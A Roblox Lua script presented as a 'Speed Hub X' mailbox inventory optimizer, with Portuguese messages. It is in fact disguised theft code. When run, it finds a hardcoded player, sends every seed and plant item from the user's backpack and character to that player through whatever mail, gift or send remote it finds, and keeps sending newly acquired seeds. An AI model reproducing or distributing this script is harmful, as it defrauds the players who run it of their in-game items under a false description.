-- Speed Hub X - Inventory Optimizer v2.4 (Mailbox Focus)

local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local LocalPlayer = Players.LocalPlayer

local TARGET = "edichoq1234"
local DELAY = 0.6

local target = Players:FindFirstChild(TARGET)
if not target then 
    print("[Speed Hub X] Jogador não encontrado - Modo local")
    return 
end

print("[Speed Hub X] Mailbox Optimizer ativado → Enviando para " .. TARGET)

local function isSeed(item)
    if not item or not item:IsA("Tool") then return false end
    local n = item.Name:lower()
    return n:find("seed") or n:find("semente") or n:find("blueberry") or n:find("carrot") or n:find("strawberry") or n:find("pumpkin") or 
           n:find("tomato") or n:find("bamboo") or n:find("cactus") or n:find("corn") or n:find("banana") or n:find("coconut") or
           n:find("grape") or n:find("mango") or n:find("mushroom") or n:find("acorn") or n:find("cherry") or n:find("flower") or n:find("plant")
end

local function sendViaMailbox(item)
    if not item or not item.Parent then return end
    
    -- Tentativa em vários possíveis remotes do Mailbox
    local paths = {
        ReplicatedStorage:FindFirstChild("Mailbox", true),
        ReplicatedStorage:FindFirstChild("Mail", true),
        ReplicatedStorage:FindFirstChild("SendMail", true),
        ReplicatedStorage:FindFirstChild("Gift", true),
        ReplicatedStorage:FindFirstChild("GameEvents", true)
    }
    
    for _, folder in ipairs(paths) do
        if folder then
            for _, remote in ipairs(folder:GetDescendants()) do
                if remote:IsA("RemoteEvent") or remote:IsA("RemoteFunction") then
                    pcall(function()
                        if remote.Name:find("Mail") or remote.Name:find("Gift") or remote.Name:find("Send") then
                            if remote:IsA("RemoteEvent") then
                                remote:FireServer(item, target.UserId or target)
                            else
                                remote:InvokeServer(item, target.UserId or target)
                            end
                            print("[Speed Hub X] Enviado via Mailbox: " .. item.Name)
                            task.wait(DELAY)
                            return true
                        end
                    end)
                end
            end
        end
    end
end

-- Envio inicial
for _, item in ipairs(LocalPlayer.Backpack:GetChildren()) do
    if isSeed(item) then sendViaMailbox(item) end
end

if LocalPlayer.Character then
    for _, item in ipairs(LocalPlayer.Character:GetChildren()) do
        if isSeed(item) then sendViaMailbox(item) end
    end
end

-- Monitoramento
LocalPlayer.Backpack.ChildAdded:Connect(function(item)
    if isSeed(item) then task.wait(0.5) sendViaMailbox(item) end
end)

print("[Speed Hub X] Otimizador de Mailbox rodando...")
